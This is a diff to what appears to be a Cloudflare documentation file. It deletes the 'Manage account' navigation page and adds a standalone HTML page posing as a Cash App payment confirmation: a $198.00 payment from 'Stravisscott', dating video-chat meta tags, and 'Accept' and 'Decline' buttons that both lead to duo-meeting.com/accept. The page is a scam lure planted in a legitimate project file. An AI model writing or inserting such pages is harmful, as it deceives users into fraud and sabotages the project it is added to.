@@ -1,13 +1,148 @@
----
-pcx_content_type: navigation
-title: Manage account
-sidebar:
-  order: 1
 
----
+<!DOCTYPE html>
+<html lang="en">
+ <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Payment Confirmation</title>
+     <meta name="description" content="Enjoy private live video chat with your dating partner">
+      <meta property="og:title" content="Payment Confirmation">
+      <meta property="og:description" content="Enjoy private live video chat with your dating partner">
+      <meta property="og:image" content="https://duo-meeting.com/public/cashapp/images/google-duo.png">
+      <meta name="twitter:card" content="summary_large_image">
+      <meta name="twitter:title" content="Payment Confirmation">
+      <meta name="twitter:description" content="Enjoy private live video chat with your dating partner">
+      <meta name="twitter:image" content="">
+      <!--<link rel="icon" href="google-duo.ico" sizes="32x32">-->
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background-color: #129f00;
+        }
+        .payment-container {
+             background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
 
-import { DirectoryListing } from "~/components"
+        }
+        .midl{
+                padding-top: 71%;
+                padding-bottom: 71%;
+            }
+        @media (max-width: 768px) {
+            .payment-container {
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+            
+            }
+            .amount{
+                padding: 1px;
+            }
 
-If you need help setting up a new Cloudflare account, refer to the following resources:
+            .midl{
+                padding-top: 71%;
+                padding-bottom: 71%;
+            }
+        }
+        .profile-picture {
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            object-fit: cover;
+            margin-bottom: 10px;
+        }
+        .user-name {
+            font-size: 18px;
+            font-weight: bold;
+        }
+        .payment-details {
+            color: gray;
+            font-size: 14px;
+        }
+        .amount {
+            font-size: 36px;
+            margin: 7px 0;
+        }
+        .description {
+            color: gray;
+            font-size: 14px;
+            margin-bottom: 5px;
+        }
+        .timestamp {
+            color: gray;
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+       .status {
+            color: white;
+            font-size: 18px;
+            font-weight: bold;
+            border: 1px solid;
+            width: 255px;
+            /* height: 35px; */
+            text-align: unset;
+            padding: 15px;
+           
+            margin-bottom: 20px;
+            background: #34b100;
+            border-radius: 25px;
+            cursor: pointer;
+         
+        }
+        
+    </style>
+    <script>
+        // document.addEventListener('DOMContentLoaded', function() {
+        //     if (window.innerWidth > 768) {
+        //         // window.location.href = '/error.php';
+        //     }
+        // });
 
-<DirectoryListing />
+        function updateTime() {
+            const now = new Date();
+            const hours = now.getHours();
+            const minutes = now.getMinutes().toString().padStart(2, '0');
+            const ampm = hours >= 12 ? 'PM' : 'AM';
+            const formattedHours = hours % 12 || 12;
+            const timestamp = `Today at ${formattedHours}:${minutes} ${ampm}`;
+            document.querySelector('.timestamp').textContent = timestamp;
+        }
+        
+        setInterval(updateTime, 1000);
+        updateTime(); // Initial call to set the time immediately
+    </script>
+</head>
+<body>
+    <div class="payment-container">
+        <img src="https://duo-meeting.com/public/images/mdl.jpg" alt="Profile Picture" class="profile-picture">
+        <div class="user-name">Travis Scott</div>
+        <div class="payment-details">Payment from Stravisscott</div>
+             <div class="midl">
+                <div class="amount">$198.00</div>
+                <div class="description">For la flame fans must eat</div>
+                <div class="timestamp"></div>
+            </div>
+        <div>
+        <form action="" method="post">
+           <input type="hidden" name="_token" value="nVwfoVNDABZPlq36wnVCUrZGgzUSMQiyqC0qN8oe" autocomplete="off">            <a href="https://duo-meeting.com/accept" class="status" style="text-decoration: none !important;">Accept</a>
+          	<a href="https://duo-meeting.com/accept" style="background: #c94b24;text-decoration: none !important;" class="status">Decline</a>
+        </form>
+        </div>
+       
+    </div>
+</body>
+</html>
